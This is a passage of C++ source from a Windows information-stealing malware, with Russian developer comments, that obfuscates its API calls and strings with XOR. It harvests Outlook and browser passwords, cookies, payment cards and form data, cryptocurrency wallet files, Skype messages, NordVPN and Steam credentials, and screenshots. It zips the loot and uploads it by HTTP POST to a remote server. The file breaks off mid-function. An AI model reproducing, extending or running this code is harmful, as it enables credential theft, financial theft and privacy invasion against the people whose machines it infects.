#include "Stealing.h"

void Stealing::ReadAllText(const string & file, string & text)
{
	try
	{
		text = string();
		HANDLE hFile = FNC(CreateFileA, XOR("Kernel32.dll"))(file.c_str(), XorInt(GENERIC_READ), 
			XorInt(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), 0, XorInt(OPEN_EXISTING), XorInt(FILE_ATTRIBUTE_NORMAL), 0);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			DWORD dwSize = FNC(GetFileSize, XOR("Kernel32.dll"))(hFile, 0);
			if (dwSize != 0)
			{
				char* buff = new char[dwSize];
				if (buff != nullptr)
				{
					DWORD dwBytes;
					FNC(ReadFile, XOR("Kernel32.dll"))(hFile, buff, dwSize, &dwBytes, 0);
					text = string(buff, dwBytes);
				}
				delete[] buff;
			}

			FNC(CloseHandle, XOR("Kernel32.dll"))(hFile);
		}
	}
	catch (...) { text = ""; return; }
}

string Stealing::DecryptStr(const string & bytes)
{
	try
	{
		if (bytes.empty())
			return "";

		DATA_BLOB in, out;

		in.pbData = (BYTE*)bytes.c_str();
		in.cbData = bytes.size() + 1;
		
		if (cryptUnprotectData(&in, NULL, 0, 0, 0, 0, &out))
			return string((const char*)out.pbData, out.cbData);

		return "";
	}
	catch (...) { return ""; }
}

vector<byte> Stealing::OutlookDecrypt(const vector<byte> & bytes)
{
	try
	{
		if (bytes.empty())
			return vector<byte>();

		vector<byte> result(bytes.size() - 1);
		size_t srcOffset = 1, count = bytes.size() - 1, dstOffset = 0;
		while (count--)
			result[dstOffset++] = bytes[srcOffset++]; // копируем буффер начиная с 1ого (не 0ого) эллемента

		DATA_BLOB in, out;
		in.pbData = (BYTE*)result.data();
		in.cbData = result.size() + 1;

		if (cryptUnprotectData(&in, NULL, 0, 0, 0, 0, &out))
		{
			result.clear();
			for (DWORD i = 0; i < out.cbData; ++i)
				result.push_back(out.pbData[i]);
			return result;
		}
		
		return vector<byte>();
	}
	catch (...) { return vector<byte>(); }
}

string Stealing::ResolveLinkPath(const string & link)
{
	try
	{
		string res = string();
		if (!link.empty())
		{
			ReadAllText(link, res);
			res = res.substr(res.find(link[0] + string(XOR(":\\"))));
			res = string(res.c_str());
		}

		return res;
	}
	catch (...) { return string(); }
}

bool Stealing::CopyByMask(const string & path, const string & mask, const string & output, size_t size, bool secondLvl, const vector<string> & exceptions, bool add_dir)
{
	try
	{
		if (size != 0 && grabber.iSumFileSize != 0 && iSumFileSizes >= grabber.iSumFileSize)
			return false;

		WIN32_FIND_DATA data;
		HANDLE hFind = findFirstFileA((path + '\\' + mask).c_str(), &data);
		bool isCopied = false;
		
		if (hFind != INVALID_HANDLE_VALUE)
		{
			string file_name = string(), dir = string();
			bool alreadyAdded = false, isLnk = false;
			do
			{
				if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					continue;

				file_name = data.cFileName;
				if (file_name.substr(file_name.find('.') + 1) == XOR("lnk"))
				{
					isLnk = true;
					file_name = ResolveLinkPath(path + '\\' + file_name);
				}

				WIN32_FILE_ATTRIBUTE_DATA fad;
				if (size != 0 && FNC(GetFileAttributesExA, XorStr("Kernel32.dll"))((path + '\\' + file_name).c_str(), GetFileExInfoStandard, &fad))
				{
					LARGE_INTEGER liSize;
					liSize.HighPart = fad.nFileSizeHigh;
					liSize.LowPart = fad.nFileSizeLow;
					__int64 ssize = liSize.QuadPart;
					ssize /= 1024;
					ssize = ssize == 0 ? 1 : ssize;
					
					if (ssize >= size)
						continue;

					if (grabber.iSumFileSize != 0)
					{
						iSumFileSizes += ssize;
						if (iSumFileSizes >= grabber.iSumFileSize)
						{
							iSumFileSizes -= ssize;
							continue;
						}
					}

					if (!exceptions.empty())
					{
						bool blackListed = false;
						for (size_t i = 0; i < exceptions.size(); ++i)
						{
							if (file_name.find(exceptions[i]) != string::npos)
							{
								blackListed = true;
								break;
							}
						}

						if (blackListed)
							continue;
					}
				}

				if (!add_dir)
					zip.addFile(isLnk ? file_name : path + '\\' + file_name, output + '\\' + (isLnk ? stripToDirectory(file_name) : file_name));
				else
				{
					dir = stripToDirectory(path);
					if (!dir.empty())
					{
						if (!alreadyAdded)
						{
							zip.addFolder(output + '\\' + dir);
							alreadyAdded = true;
						}
						zip.addFile(isLnk ? file_name : path + '\\' + file_name, output + '\\' + dir + '\\' + (isLnk ? stripToDirectory(file_name) : file_name));
					}
					else
						zip.addFile(isLnk ? file_name : path + '\\' + file_name, output + '\\' + (isLnk ? stripToDirectory(file_name) : file_name));
				}

				isCopied = true;
				isLnk = false;
			} while (findNextFileA(hFind, &data));
			findClose(hFind);
		}

		if (secondLvl)
		{
			WIN32_FIND_DATA sub;
			HANDLE hSub = findFirstFileA((path + "\\*").c_str(), &sub);
			if (hSub != INVALID_HANDLE_VALUE)
			{
				bool proceed = true;
				do
				{
					if (sub.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
						const string file_name = sub.cFileName;
						if (file_name == ".." || file_name == ".")
							continue;
						if (!exceptions.empty())
						{
							for (size_t i = 0; i < exceptions.size() && proceed; ++i)
							{
								if (file_name.find(exceptions[i]) != string::npos)
									proceed = false;
							}
						}

						if (proceed)
							CopyByMask(path + '\\' + file_name, mask, output, size, false, exceptions, add_dir);
						proceed = true;
					}
				} while (findNextFileA(hSub, &sub));
				findClose(hSub);
			}
		}

		return isCopied;
	}
	catch (...) { return false; }
}

void Stealing::CopyByMaskRecursive(const string & path, const string & mask, const string & output, size_t size, const vector<string> & exceptions, bool add_dir)
{
	try
	{
		WIN32_FIND_DATA data;
		HANDLE hFind = findFirstFileA((path + "\\*").c_str(), &data);
		string file_name = string();

		if (hFind != INVALID_HANDLE_VALUE)
		{
			CopyByMask(path, mask, output, size, false, exceptions, add_dir);
			bool proceed = true;
			do
			{
				file_name = data.cFileName;
				if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if (file_name == "." || file_name == "..")
						continue;
					if (!exceptions.empty())
					{
						for (size_t i = 0; i < exceptions.size() && proceed; ++i)
						{
							if (file_name.find(exceptions[i]) != string::npos)
								proceed = false;
						}
					}

					if (proceed)
						CopyByMaskRecursive(path + '\\' + file_name, mask, output + '\\' + stripToDirectory(path), size, exceptions, add_dir);
					proceed = true;
				}
			} while (findNextFileA(hFind, &data));

			findClose(hFind);
		}
	}
	catch (...) { return; }
}

bool Stealing::Release(const string & server, const string & path, const string & file_name)
{
	try
	{
		HINTERNET hInternet = internetOpenA(user_agent.c_str(), XorInt(INTERNET_OPEN_TYPE_PRECONFIG), NULL, NULL, 0);
		if (hInternet != NULL)
		{
			DWORD timeOut = XorInt(300000);
			internetSetOptionA(hInternet, XorInt(INTERNET_OPTION_SEND_TIMEOUT), &timeOut, sizeof(timeOut));
			HINTERNET hConnect = internetConnectA(hInternet, server.c_str(), port, NULL, NULL, XorInt(INTERNET_SERVICE_HTTP), 0, 1);
			if (hConnect != NULL)
			{
				DWORD flag = XorInt(INTERNET_FLAG_KEEP_CONNECTION) 
					| XorInt(INTERNET_FLAG_NO_CACHE_WRITE) 
					| XorInt(INTERNET_FLAG_PRAGMA_NOCACHE);

				if (port == XorInt(INTERNET_DEFAULT_HTTPS_PORT))
					flag |= XorInt(INTERNET_FLAG_SECURE);

				HINTERNET hRequest = httpOpenRequestA(hConnect, XOR("POST"), path.c_str(), NULL, NULL, 0, flag, 1);
				if (hRequest != NULL)
				{
					string sOptional = 
						XOR("-----------------------------228\r\nContent-Disposition: form-data; name=\"file\"; filename=\"");
					sOptional += file_name + XOR("\"\r\n");
					sOptional += XOR("Content-Type: application/octet-stream\r\n\r\n");
					sOptional += archiveBytes;
					sOptional += XOR("\r\n-----------------------------228--\r\n");

					string sHeaders = XOR("\r\nContent-Type: multipart/form-data; boundary=---------------------------228");

					BOOL res = httpSendRequestA(hRequest, sHeaders.c_str(),
						sHeaders.size(), (LPVOID)sOptional.c_str(), sOptional.size());
					for (int i = 0; i < XorInt(10) && !res; ++i)
						res = httpSendRequestA(hRequest, sHeaders.c_str(), sHeaders.size(), (LPVOID)sOptional.c_str(), sOptional.size());

					if (res)
						archiveBytes.clear();
					internetCloseHandle(hRequest);
					return res;
				}
				internetCloseHandle(hConnect);
			}
			internetCloseHandle(hInternet);
		}

		return false;
	}
	catch (...) { return false; }
}

void Stealing::GetStringRegKeyA(HKEY hkey, const string & strValueName, string & output, const string & def_value)
{
	try
	{
		output = string();
		char szBuffer[512];
		DWORD dwBufferSize = sizeof(szBuffer);
		ULONG nError;
		nError = FNC(RegQueryValueExA, XorStr("Advapi32.dll"))(hkey, strValueName.c_str(), 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
		if (ERROR_SUCCESS == nError)
			output = string(szBuffer);
		else
			output = def_value;
		return;
	}
	catch (...) { output = def_value; return; }
}

void Stealing::GetStringRegKeyBytes(HKEY hKey, const string & strValueName, vector<byte> & output, const vector<byte> & def_value)
{
	try
	{
		output = def_value;
		char szBuffer[512];
		DWORD dwBufferSize = sizeof(szBuffer);
		ULONG nError;
		nError = FNC(RegQueryValueExA, XorStr("Advapi32.dll"))(hKey, strValueName.c_str(), 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
		if (ERROR_SUCCESS == nError)
		{
			for (size_t i = 0; i < dwBufferSize; ++i)
				output.push_back(szBuffer[i]);
		}

		return;
	}
	catch (...) { output = def_value; return; }
}

string Stealing::ConvertUnicodeVectorToString(const vector<byte> & vec) const
{
	try
	{
		string res = "";
		if (!vec.empty())
		{
			if (vec[1] == 0) // unicode string
			{
				for (size_t i = 0; i < vec.size(); ++i)
				{
					if (!(i & 1))
					{
						res += vec[i];
						if (vec[i] == 0)
							break;
					}
				}
			}
			else // ansi string
			{
				for (size_t i = 0; i < vec.size(); ++i)
					res += vec[i];
			}
		}

		return res;
	}
	catch (...) { return ""; }
}

string Stealing::ExtractOutlook(HKEY hProfile)
{
	try
	{
		string sEmail, sSmtpServer, res = "";

		vector<byte> vecEmail, vecSmtpServer;
		vector<byte> vecPassword;

		GetStringRegKeyBytes(hProfile, XOR("Email"), vecEmail, vector<byte>());
		GetStringRegKeyBytes(hProfile, XOR("SMTP Server"), vecSmtpServer, vector<byte>());

		sEmail = ConvertUnicodeVectorToString(vecEmail);
		if (!sEmail.empty())
		{
			sSmtpServer = ConvertUnicodeVectorToString(vecSmtpServer);

			GetStringRegKeyBytes(hProfile, XOR("IMAP Password"), vecPassword, vector<byte>());
			if (vecPassword.empty())
			{
				GetStringRegKeyBytes(hProfile, XOR("POP3 Password"), vecPassword, vector<byte>());
				if (vecPassword.empty())
				{
					GetStringRegKeyBytes(hProfile, XOR("HTTP Password"), vecPassword, vector<byte>());
					if (vecPassword.empty())
						GetStringRegKeyBytes(hProfile, XOR("SMTP Password"), vecPassword, vector<byte>());
				}
			}

			if (!vecPassword.empty())
			{
				string password = ConvertUnicodeVectorToString(OutlookDecrypt(vecPassword));

				res += XOR("Email: ") + sEmail + "\r\n";
				res += XOR("Password: ") + password + "\r\n";
				res += XOR("SMTP: ") + sSmtpServer + "\r\n\r\n";
			}
		}

		return res;
	}
	catch (...) { return string(); }
}

void Stealing::OutlookScan(HKEY hStart, string & output, const string & prev_name)
{
	try
	{
		char* buff = new char[1024];
		DWORD index = 0;

		LSTATUS stat = regEnumKeyA(hStart, index, buff, 1024);
		while (stat == ERROR_SUCCESS)
		{
			HKEY hFull;
			regOpenKeyA(HKEY_CURRENT_USER, string(prev_name + '\\' + (string)buff).c_str(), &hFull);

			if (hFull != nullptr)
			{
				if (string(buff) == XOR("9375CFF0413111d3B88A00104B2A6676"))
				{
					DWORD dwProfileIndex = 0;
					char* profileName = new char[256];
					LSTATUS profileStat = regEnumKeyA(hFull, dwProfileIndex, profileName, 256);
					while (profileStat == ERROR_SUCCESS)
					{
						HKEY hProfile;
						if (regOpenKeyA(hFull, profileName, &hProfile) == ERROR_SUCCESS && hProfile != nullptr)
						{
							output += ExtractOutlook(hProfile);
							regCloseKey(hProfile);
						}

						++dwProfileIndex;
						profileStat = regEnumKeyA(hFull, dwProfileIndex, profileName, 256);
					}

					if (profileName)
						delete[] profileName;
				}
				else
					OutlookScan(hFull, output, prev_name + '\\' + (string)buff);

				regCloseKey(hFull);
			}

			++index;
			stat = regEnumKeyA(hStart, index, buff, 1024);
		}

		if (buff)
			delete[] buff;
	}
	catch (...) { return; }
}

void Stealing::RunOutlookScan(const string & entry, string & res)
{
	try
	{
		HKEY hStart;
		if (regOpenKeyA(HKEY_CURRENT_USER, entry.c_str(), &hStart) == ERROR_SUCCESS && hStart)
		{
			OutlookScan(hStart, res, entry);
			regCloseKey(hStart);
		}
	}
	catch (...) { return; }
}

int GetEncoderClsid(WCHAR * format, CLSID * pClsid)
{
	try
	{
		using namespace Gdiplus;
		unsigned int num = 0, size = 0;
		
		FNC(GdipGetImageEncodersSize, XOR("gdiplus.dll"))(&num, &size);

		if (size == 0)
			return -1;
		ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
		if (pImageCodecInfo == NULL)
			return -1;
		FNC(GdipGetImageEncoders, XOR("gdiplus.dll"))(num, size, pImageCodecInfo);

		for (unsigned int j = 0; j < num; ++j)
		{
			if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
			{
				*pClsid = pImageCodecInfo[j].Clsid;
				free(pImageCodecInfo);
				return j;
			}
		}

		free(pImageCodecInfo);
		return -1;
	}
	catch (...) { return -1; }
}

BOOL CALLBACK MonitorEnumProcCallback(HMONITOR hMonitor, HDC DevC, LPRECT lprcMonitor, LPARAM dwData)
{
	try
	{
		using namespace Gdiplus;

		if (!dwData)
			return FALSE;
		ScreenshotRoutine* routine = (ScreenshotRoutine*)dwData;

		MONITORINFOEX  info;
		info.cbSize = sizeof(MONITORINFOEX);

		BOOL monitorInfo = FNC(GetMonitorInfoA, XOR("User32.dll"))(hMonitor, &info);
		if (monitorInfo)
		{
			char* gdi32 = XOR("Gdi32.dll");

			ULONG_PTR gdiplusToken;
			GdiplusStartupInput gdiplusStartupInput;
			FNC(GdiplusStartup, XOR("Gdiplus.dll"))(&gdiplusToken, &gdiplusStartupInput, NULL);

			/*HWND hMyWnd = FNC(GetDesktopWindow, XorStr("User32.dll"))();
			RECT r;
			FNC(GetWindowRect, XorStr("User32.dll"))(hMyWnd, &r);*/
			HDC dc = FNC(CreateDCA, gdi32)(NULL, info.szDevice, NULL, NULL); //FNC(GetWindowDC, XorStr("User32.dll"))(hMyWnd);

			int w = info.rcMonitor.right - info.rcMonitor.left;
			int h = info.rcMonitor.bottom - info.rcMonitor.top;

			int nBPP = FNC(GetDeviceCaps, gdi32)(dc, XorInt(BITSPIXEL));
			HDC hdcCapture = FNC(CreateCompatibleDC, gdi32)(dc);

			BITMAPINFO bmiCapture = { XorInt(sizeof(BITMAPINFOHEADER)), w, -h, XorInt(1), nBPP, XorInt(BI_RGB), 0, 0, 0, 0, 0, };

			LPBYTE lpCapture;
			HBITMAP hbmCapture = FNC(CreateDIBSection, gdi32)(dc, &bmiCapture, DIB_PAL_COLORS, (LPVOID*)&lpCapture, NULL, 0);
			if (!hbmCapture)
			{
				FNC(DeleteDC, gdi32)(hdcCapture);
				FNC(DeleteDC, gdi32)(dc);
				FNC(GdiplusShutdown, gdi32)(gdiplusToken);
				return FALSE;
			}

			int nCapture = FNC(SaveDC, gdi32)(hdcCapture);
			FNC(SelectObject, gdi32)(hdcCapture, hbmCapture);
			FNC(BitBlt, gdi32)(hdcCapture, 0, 0, w, h, dc, 0, 0, XorInt(SRCCOPY));
			FNC(RestoreDC, gdi32)(hdcCapture, nCapture);
			FNC(DeleteDC, gdi32)(hdcCapture);
			FNC(DeleteDC, gdi32)(dc);

			const char* szFormat = XOR("image/png");
			wchar_t* wszFormat = new wchar_t[10]; // размер кодека, image/ + название + '\0'
			mbstowcs(wszFormat, szFormat, XorInt(10));
			CLSID imageCLSID;
			GetEncoderClsid(wszFormat, &imageCLSID); // первым аргументом идет название енкодера "image/тут формат", msdn
			delete[] wszFormat;

			IStream* pStream = NULL;
			LARGE_INTEGER liZero = { };
			ULARGE_INTEGER pos = { };
			STATSTG stg = { };

			BitmapC* pScreenShot = new BitmapC(hbmCapture, (HPALETTE)0); // Кастомный тип, является вырезкой из винапи классов
			// Перенесены классы Bitmap -> BitmapC и его родитель Image -> ImageC
			// Был выпилен GdipBase залупа, которая имеет перегрузку new\delete с статик импортом
			// Вместо них перегрузка прямо в классе с дин импортом
			if (!pScreenShot)
				return FALSE;
			FNC(CreateStreamOnHGlobal, XOR("Ole32.dll"))(NULL, XorInt(TRUE), &pStream);
			pScreenShot->Save(pStream, &imageCLSID);
			pStream->Seek(liZero, (DWORD)XorInt((DWORD)STREAM_SEEK_SET), &pos);
			pStream->Stat(&stg, (DWORD)XorInt((DWORD)STATFLAG_NONAME));

			BYTE* buffer = new BYTE[stg.cbSize.LowPart];
			if (buffer == nullptr)
				return FALSE;

			ULONG bytesRead = 0;
			pStream->Read(buffer, stg.cbSize.LowPart, &bytesRead);

			const string jpeg_file = string((char*)buffer, bytesRead);
			routine->zip.addFileMemory((routine->screenshotIndex ? XOR("Screenshot_") 
				+ std::to_string(routine->screenshotIndex) + XOR(".jpeg") : XOR("Screenshot.jpeg")), jpeg_file);
			routine->screenshotIndex++;
			delete[] buffer;

			if (pStream)
				pStream->Release();
			delete pScreenShot;

			FNC(DeleteObject, gdi32)(hbmCapture);
			FNC(GdiplusShutdown, XOR("Gdiplus.dll"))(gdiplusToken);

			return TRUE;
		}

		return FALSE;
	}
	catch (...) { return FALSE; }
}

void Stealing::__cpuid(int CPUInfo[4], int InfoType)
{
	try
	{
		__asm
		{
			mov esi, CPUInfo
			mov eax, InfoType
			xor ecx, ecx
			cpuid
			mov dword ptr[esi + 0], eax
			mov dword ptr[esi + 4], ebx
			mov dword ptr[esi + 8], ecx
			mov dword ptr[esi + 12], edx
		}
	}
	catch (...) { return; }
}

void Stealing::GetCpu(string & output)
{
	try
	{
		int CPUInfo[4] = { -1 };
		__cpuid(CPUInfo, 0x80000000);
		unsigned int nExIds = CPUInfo[0];

		char CPUBrandString[0x40] = { 0 };
		for (unsigned int i = 0x80000000; i <= nExIds; ++i)
		{
			__cpuid(CPUInfo, i);
			if (i == 0x80000002)
				memcpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
			else if (i == 0x80000003)
				memcpy(CPUBrandString + XorInt(16), CPUInfo, sizeof(CPUInfo));
			else if (i == 0x80000004)
				memcpy(CPUBrandString + XorInt(32), CPUInfo, sizeof(CPUInfo));
		}

		output = CPUBrandString;
	}
	catch (...) { return; }
}

string Stealing::GetCpuUsage()
{
	try
	{
		FILETIME idleTime, kernelTime, userTime;
		if (FNC(GetSystemTimes, XorStr("Kernel32.dll"))(&idleTime, &kernelTime, &userTime))
		{
			unsigned long long ullIdleTime = (idleTime.dwHighDateTime << XorInt(32)) | idleTime.dwLowDateTime,
				ullTotalTicks = ((kernelTime.dwHighDateTime << XorInt(32)) | kernelTime.dwLowDateTime)
				+ ((userTime.dwHighDateTime << XorInt(32)) | userTime.dwLowDateTime);
			// TODO: Fix this
			unsigned int percent = (unsigned int)
				((1 - (ullTotalTicks > XorInt(0) ? (float)ullIdleTime / ullTotalTicks : 0)) * XorInt(100));
			return std::to_string(percent);
		}

		return XOR("-1");
	}
	catch (...) { return ""; }
}

void Stealing::GetWalletsByName(const string & entry, const string & output)
{
	try
	{
		size_t index = entry.find_last_of('\\');
		if (index != string::npos)
		{
			++index;
			const string crypto_name = entry.substr(index) + XOR(".dat");
			if (!bWallets)
				zip.addFolder(output);
			zip.addFile(entry + XOR("\\wallet.dat"), output + '\\' + crypto_name);
			bWallets = true;

			string text = "";
			ReadAllText(entry + XOR("\\wallet.dat"), text);
			walletInfo.output += crypto_name + XOR(" address: ");
			if (!text.empty())
			{
				size_t index = text.find(XOR("name\""));
				if (index != string::npos)
				{
					text = text.substr(index + 5); // 5 = sizeof("name\"") - 1
					text = text.substr(0, text.find(1)); // ord(1) = start of heading symbol
					walletInfo.output += text;
				}
				else
					walletInfo.output += '-';
			}
			else
				walletInfo.output += '-';
			walletInfo.output += "\r\n";
		}
	}
	catch (...) { return; };
}

void Stealing::GetBrowsers(const string & path, int level)
{
	try
	{
		WIN32_FIND_DATA data;
		HANDLE hFile = findFirstFileA((path + XOR("\\*")).c_str(), &data);

		if (hFile != INVALID_HANDLE_VALUE)
		{
			string cur_file = string(), cur_path = string(), ver = string();
			
			do
			{
				cur_file = data.cFileName;
				
				if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) // в начале проверка на папку, потом на родительский католог
				{
					if (cur_file == XOR(".") || cur_file == XOR("..")) // проверка что это не родитель
						continue;
					GetBrowsers(path + '\\' + cur_file, level + XorInt(1)); // спускаемся на 1 уровень вниз
				}
				else
				{
					cur_path = path + '\\' + cur_file;

					if (cur_file == XOR("Login Data"))
					{
						GetPasswords(cur_path);
						if (cur_path.find(XOR("Opera")) != string::npos) // особенности оперы
						{
							GetCards(cur_path);
							GetForms(cur_path);
						}
					}
					else if (cur_file == XOR("Cookies"))
						GetCookies(cur_path);
					else if (cur_file == XOR("Web Data"))
					{
						GetCards(cur_path);
						GetForms(cur_path);
					}
					else if (grabber.bHistory && cur_file == XOR("History"))
						GetHistory(cur_path);
					else if (cur_file == XOR("formhistory.sqlite"))
						GetFormsGecko(cur_path);
					else if (cur_file == XOR("cookies.sqlite"))
						GetCookiesGecko(cur_path);
					else if (cur_file == XOR("wallet.dat"))
					{
						if (level <= XorInt(5)) // сбор wallet.dat до 5-ого уровня
							GetWalletsByName(path, walletOutput);
					}
					else if (cur_file.find(XOR(".sln")) != string::npos)
						solution.output += cur_file + "\r\n";
					else if (cur_file == XOR("main.db") && grabber.bSkype)
						GetSkype(cur_path);
					else if (cur_file == XOR("logins.json") || cur_file == XOR("signons.sqlite"))
						GetPasswordsGecko(cur_path);
					else if (grabber.bHistory && cur_file == XOR("places.sqlite"))
						GetHistoryGecko(cur_path);
					else if (cur_file == XOR("Last Version"))
					{
						ReadAllText(cur_path, ver);
						versions.push_back(ver);
					}
				}
			} while (findNextFileA(hFile, &data));
			findClose(hFile);
		}
	}
	catch (...) { return; }
}

void Stealing::GetSkype(const string & db_path)
{
	try
	{
		string output = "";
		bool b;
		SqlHandler* sql = new SqlHandler(db_path, b);
		if (b && sql->ReadTable(XOR("Chats")))
		{
			const int rowCount = sql->GetRowCount();
			output += XOR("Chats:\r\n\r\n");
			for (int i = 0; i < rowCount; ++i)
				output += sql->GetValue(i, 4) + XOR(" - ") + sql->GetValue(i, 14) + "\r\n";
			output += "\r\n";
		}

		if (b && sql->ReadTable(XOR("Messages")))
		{
			const int rowCount = sql->GetRowCount();
			output += XOR("Messages:\r\n\r\n");
			for (int i = 0; i < rowCount; ++i)
				output += XOR("From: ") + sql->GetValue(i, 5) + XOR("\r\nTo: ") + sql->GetValue(i, 3)
				+ XOR("\r\nMessage: ") + sql->GetValue(i, 18) + "\r\n\r\n";
		}

		if (output != "")
			skype.output += output + "\r\n";

		delete sql;
	}
	catch (...) { return; }
}

void Stealing::GetWindowsCookies()
{
	try
	{
		const string base_dir = (string)getenv(XOR("localappdata")) + XOR("\\Microsoft\\Windows\\INetCookies");
		WIN32_FIND_DATA data;
		HANDLE hFile = findFirstFileA((base_dir + XOR("\\*")).c_str(), &data);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			string res = string();
			do
			{
				const string file_name = data.cFileName;
				if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if (file_name == "." || file_name == "..")
						continue;
					WIN32_FIND_DATA down_folder;
					HANDLE hDownFolder = findFirstFileA
						(((string)(base_dir + '\\' + (string)data.cFileName + XOR("\\*.cookie"))).c_str(), &down_folder);
					if (hDownFolder == INVALID_HANDLE_VALUE)
						continue;
					do
					{
						NetscapeCookie(base_dir + '\\' + (string)data.cFileName + '\\' + (string)down_folder.cFileName, res);
					} while (findNextFileA(hDownFolder, &down_folder));
					findClose(hDownFolder);
				}
				else
				{
					if (file_name.find(XOR(".cookie")) != string::npos)
						NetscapeCookie(base_dir + '\\' + (string)data.cFileName, res);
				}
			} while (findNextFileA(hFile, &data));

			findClose(hFile);
			zip.addFileMemory(cookiePath + XOR("\\Windows_") + std::to_string(cookieIndex) + XOR(".txt"), res);
			++cookieIndex;
		}
	}
	catch (...) { return; }
}

void Stealing::GetCookieList(const string & output_path)
{
	try
	{
		string output = "";
		for (string & str : cookieList)
			output += str + '\n';

		zip.addFileMemory(output_path, output);
		cookieList.clear();
	}
	catch (...) { return; }
}

void Stealing::GetNordVpn(const string & output_dir)
{
	try
	{
		string path = "", fileCon = "", res = XOR("Login: ");
		const string initial_dir = (string)getenv(XOR("localappdata")) + XOR("\\NordVPN");

		WIN32_FIND_DATA data;
		HANDLE hFile = findFirstFileA((initial_dir + XOR("\\NordVPN*")).c_str(), &data);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			path = initial_dir + '\\' + (string)data.cFileName;
			findClose(hFile);
		}
		else
			return;

		bool isFound = false;
		WIN32_FIND_DATA pData;
		HANDLE hFolder = findFirstFileA((path + "\\*").c_str(), &pData);
		if (hFolder != INVALID_HANDLE_VALUE)
		{
			do
			{
				if (pData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					const string file_name = pData.cFileName;
					if (file_name == "." || file_name == "..")
						continue;
					path += '\\' + file_name;
					isFound = true;
					break;
				}
			} while (findNextFileA(hFolder, &pData));
			findClose(hFolder);
		}

		if (!isFound)
			return;
		path += XOR("\\user.config");
		ReadAllText(path, fileCon);

		if (!fileCon.empty())
		{
			res += DecryptStr(base64_decode(xml_get(fileCon, XOR("Username"))))
				+ XOR("\r\nPassword: ") + DecryptStr(base64_decode(xml_get(fileCon, XOR("Password"))));
			zip.addFolder(output_dir);
			zip.addFileMemory(output_dir + XOR("\\NordVPN.txt"), res);
		}
	}
	catch (...) { return; }
}

void Stealing::SteamHelper(const string & entry, const string & output)
{
	try
	{
		string fileCon = "";
		ReadAllText(entry + XOR("\\config\\loginusers.vdf"), fileCon);
		if (fileCon == "")
			return;

		vector<string> vec;
		splitBy(fileCon, '\n', vec);
		string res = XOR("Logged accounts:\r\n");

		for (string & temp : vec)
		{
			size_t firstB = temp.find('\"'), secondB = temp.rfind('\"') - 1;

			if (firstB != string::npos && secondB != string::npos)
			{
				if (isNumeric(temp.substr(firstB + 1, secondB - firstB)))
					res += XOR("http://steamcommunity.com/profiles/") + temp.substr(firstB + 1, secondB - firstB) + "\r\n";
			}
		}

		const string scan_dir = entry + XOR("\\steamapps\\common\\*");
		WIN32_FIND_DATA data;
		HANDLE hConfig = findFirstFileA(scan_dir.c_str(), &data);
		if (hConfig == INVALID_HANDLE_VALUE)
			findClose(hConfig);
		else
		{
			res += XOR("\r\nInstalled games:\r\n");
			do
			{
				if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					const string file_name = data.cFileName;
					if (file_name == "." || file_name == "..")
						continue;
					res += (string)data.cFileName + "\r\n";
				}
			} while (findNextFileA(hConfig, &data));
			findClose(hConfig);
		}

		if (res != "")
			zip.addFileMemory(output + XOR("\\SteamInfo.log"), res);
	}
	catch (...) { return; }
}

bool Stealing::splitBy(const string & str, char delim, vector<string> & output, bool leaveEmpty)
{
	try
	{
		if (str == "")
			return false;
		output.clear();
		string temp = "";
		for (int i = 0; i < str.size(); ++i)
		{
			if (str[i] != delim)
				temp += str[i];
			else
			{
				if (leaveEmpty || temp != "")
				{
					output.push_back(temp);
					temp = "";
				}
			}
		}

		if (leaveEmpty || temp != "")
			output.push_back(temp);
		output.shrink_to_fit();
		return true;
	}
	catch (...) { return false; }
}

string Stealing::xml_get(const string & text, const string & attribute)
{
	try
	{
		string res = text;
		res = res.substr(res.find(attribute));
		res = res.substr(0, res.find(XOR("</setting>")));
		res = res.substr(res.find(XOR("<value>")));
		res = res.substr(7);
		res = res.substr(0, res.find(XOR("</value>")));
		return res;
	}
	catch (...) { return ""; }
}

string Stealing::random_string(const size_t size)
{
	try
	{
		string res = "";
		for (size_t i = 0; i < size; ++i)
		{
			int rnd = 'a' + rand() % 'z';
			while (rnd > 'z')
				rnd = 'a' + rnd % 'z';
			res += (char)rnd;
		}

		return res;
	}
	catch (...) { return ""; }
}

bool Stealing::contains_record(const vector<string> & vec, const string & entry)
{
	try
	{
		string query = entry;
		for (char & ch : query)
		{
			if (ch >= 'A' && ch <= 'Z')
				ch += XorInt(32);
		}

		for (size_t i = 0; i < vec.size(); ++i)
		{
			if (query.find(vec[i]) != string::npos)
				return true;
		}

		return false;
	}
	catch (...) { return false; }
}

string Stealing::replaceEnvVar(const string & str, bool* extended)
{
	try
	{
		string res = "";
		for (size_t i = 0; i < str.size(); ++i)
		{
			if (str[i] == '%')
			{
				string temp = "";
				for (; str[++i] != '%';)
					temp += str[i];
				if (extended && !(*extended) && temp == XOR("ANYDRIVE"))
					*extended = true;
				else
				{
					if (getenv(temp.c_str()) == nullptr)
						return "";
					res += getenv(temp.c_str());
				}
			}
			else
				res += str[i];
		}

		return res;
	}
	catch (...) { return ""; }
}

bool Stealing::isNumeric(const string & str)
{
	try
	{
		for (size_t i = 0; i < str.size(); ++i)
		{
			if (str[i] < '0' || str[i] > '9')
				return false;
		}
		return true;
	}
	catch (...) { return false; }
}

string Stealing::trimStr(const string & str, char symbol)
{
	try
	{
		string res = "";
		for (size_t i = 0; i < str.size(); ++i)
			if (str[i] != symbol)
				res += str[i];
		return res;
	}
	catch (...) { return ""; }
}

string Stealing::extractDomain(const string & domain)
{
	try
	{
		if (domain.empty())
			return "";
		if (domain.find('/') == string::npos)
			return domain;
		string result = "";
		size_t idx = 0;
